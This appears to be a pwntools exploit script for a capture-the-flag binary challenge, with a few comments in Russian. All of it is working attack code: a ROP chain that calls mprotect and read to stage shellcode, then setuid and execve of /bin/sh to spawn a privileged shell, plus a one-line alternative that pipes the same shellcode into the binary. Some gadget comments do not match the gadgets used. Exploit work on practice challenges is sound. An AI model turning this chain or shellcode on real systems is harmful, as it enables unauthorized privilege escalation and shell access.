from pwn import *
shellcode =  "\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05";
setuid = 105
syscall = 0x0000000000434e15
ch = process("/challenge/app-systeme/ch34/ch34")
chain = "\x90"*280
##################mprotect############################
chain += p64(0x00437205)    # pop rdx; pop rsi; ret 
chain += p64(0x7)

chain += p64(0x0041bd9f)  #xor rax    
chain += p64(0x0045aa10)*10 # inc rax   0xa является началом новой строки и в памяти он будет лежать нехорошо( по-этому придётся регистр rax инкрементировать до числа 10

chain += p64(0x004016d3)    # pop rdi; ret 
chain += p64(0x6bf000)

chain += p64(0x004017e7)    # pop rsi; ret 
chain += p64(0x100)
chain += p64(syscall)
####################read###############################
chain += p64(0x0041bd9f)  #xor rax

chain += p64(0x004016d3)    # pop rdi; ret 
chain += p64(0x0)                       #stdin

chain += p64(0x004017e7)    # pop rdi; ret 
chain += p64(0x6bf000)

chain += p64(0x00437205)    # pop rdx; ret 
chain += p64(0x100)
chain += p64(syscall)
##############SETUID#################################
chain += p64(0x004016d3)
chain += p64(1234)
chain += p64(0x0044d2b4)
chain += p64(setuid)
chain += p64(syscall)
###################JMP shellcode#####################
chain += p64(0x6bf000)
#print(chain)
ch.sendline(chain)
ch.sendline(shellcode)
ch.interactive()
#альтернативный запуск
(python2 /tmp/fff/fl.py ; python2 -c'print "\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05"';cat)|./ch34
